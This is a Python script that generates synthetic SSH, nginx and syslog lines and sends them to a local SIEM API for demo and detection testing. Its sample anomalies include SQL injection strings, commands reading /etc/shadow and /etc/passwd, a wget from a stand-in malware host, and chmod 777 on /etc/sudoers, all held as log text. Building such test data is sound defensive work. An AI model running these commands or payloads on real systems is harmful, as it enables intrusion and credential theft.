#!/usr/bin/env python3
"""
Continuous Log Generator for SIEM Demo.

Simulates realistic security log traffic by sending logs continuously
to the SIEM API at configurable intervals. Useful for demos, testing,
and development.

Usage:
    python scripts/log_generator.py --rate 10 --interval 5

    --rate: Logs per minute (default: 10)
    --interval: Seconds between batches (default: 5)
    --anomaly-rate: Percentage of anomalies 0.0-1.0 (default: 0.15 = 15%)
"""

import argparse
import random
import time
from datetime import datetime, timedelta
from typing import Any

import requests

# ============================================================================
# Configuration
# ============================================================================
API_URL = "http://localhost:8000/api/v1/logs/analyze"

# Realistic IP pools
NORMAL_IPS = [
    "192.168.1.50",
    "192.168.1.51",
    "192.168.1.52",
    "10.0.0.100",
    "10.0.0.101",
]

SUSPICIOUS_IPS = [
    "185.234.219.45",  # Russia
    "45.132.246.198",  # China
    "103.99.0.123",  # Unknown
    "198.51.100.45",  # Tor exit node
]

NORMAL_USERS = ["john", "alice", "bob", "charlie", "david"]
PRIVILEGED_USERS = ["root", "admin", "administrator"]

# ============================================================================
# Log Templates
# ============================================================================


def generate_ssh_success() -> dict[str, Any]:
    """Generate normal SSH login."""
    user = random.choice(NORMAL_USERS)
    ip = random.choice(NORMAL_IPS)
    port = random.randint(50000, 60000)
    hour = datetime.now().hour

    log_line = (
        f"Jan {datetime.now().day} {hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} "
        f"server sshd[{random.randint(1000, 9999)}]: "
        f"Accepted password for {user} from {ip} port {port} ssh2"
    )

    return {
        "log_line": log_line,
        "source": "auth",
        "expected": "normal",
    }


def generate_ssh_failed_brute_force() -> dict[str, Any]:
    """Generate SSH brute force attack (ANOMALY)."""
    user = random.choice(PRIVILEGED_USERS)
    ip = random.choice(SUSPICIOUS_IPS)
    port = random.randint(50000, 60000)
    # Attacks usually at night
    hour = random.choice([2, 3, 4, 5])

    log_line = (
        f"Jan {datetime.now().day} {hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} "
        f"server sshd[{random.randint(1000, 9999)}]: "
        f"Failed password for {user} from {ip} port {port} ssh2"
    )

    return {
        "log_line": log_line,
        "source": "auth",
        "expected": "anomaly",
    }


def generate_nginx_success() -> dict[str, Any]:
    """Generate normal web request."""
    ip = random.choice(NORMAL_IPS)
    endpoints = ["/api/users", "/api/products", "/dashboard", "/login", "/"]
    endpoint = random.choice(endpoints)
    status = random.choice([200, 200, 200, 304])
    bytes_sent = random.randint(500, 5000)
    hour = datetime.now().hour

    log_line = (
        f"Jan {datetime.now().day} {hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} "
        f"web nginx: {ip} - - [{datetime.now().day}/Jan/2026:{hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} +0000] "
        f'"GET {endpoint} HTTP/1.1" {status} {bytes_sent}'
    )

    return {
        "log_line": log_line,
        "source": "nginx",
        "expected": "normal",
    }


def generate_sql_injection() -> dict[str, Any]:
    """Generate SQL injection attempt (ANOMALY)."""
    ip = random.choice(SUSPICIOUS_IPS)
    payloads = [
        "/admin' OR 1=1--",
        "/users?id=1' UNION SELECT * FROM passwords--",
        "/search?q='; DROP TABLE users--",
        "/login?user=admin'--",
    ]
    payload = random.choice(payloads)
    hour = random.randint(20, 23)

    log_line = (
        f"Jan {datetime.now().day} {hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} "
        f"web nginx: {ip} - - [{datetime.now().day}/Jan/2026:{hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} +0000] "
        f'"GET {payload} HTTP/1.1" 403 156'
    )

    return {
        "log_line": log_line,
        "source": "nginx",
        "expected": "anomaly",
    }


def generate_privilege_escalation() -> dict[str, Any]:
    """Generate privilege escalation attempt (ANOMALY)."""
    user = random.choice(NORMAL_USERS)
    commands = [
        "/bin/bash /etc/shadow",
        "/bin/cat /etc/passwd",
        "/usr/bin/wget http://malware.com/cryptominer",
        "/bin/chmod 777 /etc/sudoers",
    ]
    command = random.choice(commands)
    hour = random.randint(3, 5)

    log_line = (
        f"Jan {datetime.now().day} {hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} "
        f"server sudo: {user} : command not allowed ; USER={user} ; COMMAND={command}"
    )

    return {
        "log_line": log_line,
        "source": "auth",
        "expected": "anomaly",
    }


def generate_cryptominer() -> dict[str, Any]:
    """Generate cryptomining malware detection (ANOMALY)."""
    hour = random.randint(2, 4)

    log_line = (
        f"Jan {datetime.now().day} {hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} "
        f"server systemd[1]: Started cryptominer service"
    )

    return {
        "log_line": log_line,
        "source": "syslog",
        "expected": "anomaly",
    }


def generate_normal_syslog() -> dict[str, Any]:
    """Generate normal system event."""
    events = [
        "kernel: [12345.678901] eth0: link up",
        "systemd[1]: Starting Cleanup of Temporary Directories...",
        "cron[1234]: (root) CMD (run-parts /etc/cron.hourly)",
        "kernel: [12346.123456] nf_conntrack: table full, dropping packet",
    ]
    event = random.choice(events)
    hour = datetime.now().hour

    log_line = (
        f"Jan {datetime.now().day} {hour:02d}:{random.randint(0, 59):02d}:{random.randint(0, 59):02d} "
        f"app {event}"
    )

    return {
        "log_line": log_line,
        "source": "syslog",
        "expected": "normal",
    }


# ============================================================================
# Log Generator
# ============================================================================
def generate_log(anomaly_rate: float = 0.15) -> dict[str, Any]:
    """
    Generate a random log with specified anomaly rate.

    Args:
        anomaly_rate: Probability of generating an anomaly (0.0-1.0)

    Returns:
        Log data dictionary
    """
    # Determine if this should be an anomaly
    is_anomaly = random.random() < anomaly_rate

    if is_anomaly:
        # Choose random attack type
        generator = random.choice(
            [
                generate_ssh_failed_brute_force,
                generate_sql_injection,
                generate_privilege_escalation,
                generate_cryptominer,
            ]
        )
    else:
        # Choose random normal activity
        generator = random.choice(
            [
                generate_ssh_success,
                generate_nginx_success,
                generate_normal_syslog,
            ]
        )

    return generator()


def send_log(log_data: dict[str, Any]) -> dict[str, Any] | None:
    """
    Send log to API for analysis.

    Args:
        log_data: Log data dictionary

    Returns:
        API response or None if failed
    """
    payload = {
        "log_line": log_data["log_line"],
        "source": log_data["source"],
    }

    try:
        response = requests.post(API_URL, json=payload, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"❌ API Error: {e}")
        return None


def print_status(
    total: int,
    anomalies: int,
    errors: int,
    last_result: dict[str, Any] | None,
    elapsed: float,
) -> None:
    """Print current generator status."""
    rate = total / elapsed if elapsed > 0 else 0
    anomaly_pct = (anomalies / total * 100) if total > 0 else 0

    print(
        f"\r📊 Total: {total} | 🔴 Anomalies: {anomalies} ({anomaly_pct:.1f}%) | "
        f"❌ Errors: {errors} | ⚡ Rate: {rate:.1f} logs/sec",
        end="",
    )

    if last_result:
        risk = last_result.get("risk_score", 0)
        emoji = "🔴" if risk >= 0.8 else "🟠" if risk >= 0.6 else "🟢"
        print(f" | Last: {emoji} {risk:.3f}", end="")


# ============================================================================
# Main Loop
# ============================================================================
def main() -> None:
    """Run continuous log generator."""
    parser = argparse.ArgumentParser(description="Continuous SIEM Log Generator")
    parser.add_argument(
        "--rate",
        type=int,
        default=10,
        help="Target logs per minute (default: 10)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=5.0,
        help="Seconds between batches (default: 5.0)",
    )
    parser.add_argument(
        "--anomaly-rate",
        type=float,
        default=0.15,
        help="Anomaly rate 0.0-1.0 (default: 0.15 = 15%%)",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=0,
        help="Run for N seconds (0 = infinite, default: 0)",
    )

    args = parser.parse_args()

    # Calculate logs per batch
    logs_per_batch = max(1, int(args.rate * args.interval / 60))

    print("=" * 80)
    print("🔄 CONTINUOUS LOG GENERATOR")
    print("=" * 80)
    print(f"🎯 Target Rate: {args.rate} logs/min")
    print(f"⏱️  Batch Interval: {args.interval}s")
    print(f"📦 Logs per Batch: {logs_per_batch}")
    print(f"🔴 Anomaly Rate: {args.anomaly_rate:.1%}")
    if args.duration > 0:
        print(f"⏳ Duration: {args.duration}s")
    else:
        print("⏳ Duration: Infinite (Ctrl+C to stop)")
    print("=" * 80)
    print()

    # Health check
    try:
        health = requests.get("http://localhost:8000/api/v1/health", timeout=5)
        if health.status_code == 200:
            print("✅ API is healthy\n")
        else:
            print("⚠️  API health check failed\n")
    except Exception:
        print("❌ ERROR: API is not responding. Start it with:")
        print("   docker compose up -d")
        print()
        return

    # Statistics
    stats = {
        "total": 0,
        "anomalies": 0,
        "errors": 0,
    }

    start_time = time.time()
    last_result = None

    print("🚀 Starting log generation... (Press Ctrl+C to stop)\n")

    try:
        while True:
            # Check duration limit
            if args.duration > 0 and (time.time() - start_time) >= args.duration:
                break

            # Generate and send batch
            for _ in range(logs_per_batch):
                log_data = generate_log(args.anomaly_rate)
                result = send_log(log_data)

                if result:
                    stats["total"] += 1
                    if result.get("is_anomaly"):
                        stats["anomalies"] += 1
                    last_result = result
                else:
                    stats["errors"] += 1

            # Update status
            elapsed = time.time() - start_time
            print_status(
                stats["total"],
                stats["anomalies"],
                stats["errors"],
                last_result,
                elapsed,
            )

            # Wait for next batch
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n\n🛑 Stopped by user")

    # Final summary
    elapsed = time.time() - start_time
    print("\n")
    print("=" * 80)
    print("📊 FINAL SUMMARY")
    print("=" * 80)
    print(f"⏱️  Duration: {elapsed:.1f}s")
    print(f"📝 Total Logs: {stats['total']}")
    print(
        f"🔴 Anomalies: {stats['anomalies']} ({stats['anomalies'] / stats['total'] * 100:.1f}%)"
        if stats["total"] > 0
        else "🔴 Anomalies: 0"
    )
    print(f"❌ Errors: {stats['errors']}")
    print(
        f"⚡ Average Rate: {stats['total'] / elapsed:.2f} logs/sec"
        if elapsed > 0
        else "⚡ Average Rate: 0"
    )
    print("=" * 80)
    print("\n💡 View results at: http://localhost:5173")
    print()


if __name__ == "__main__":
    main()
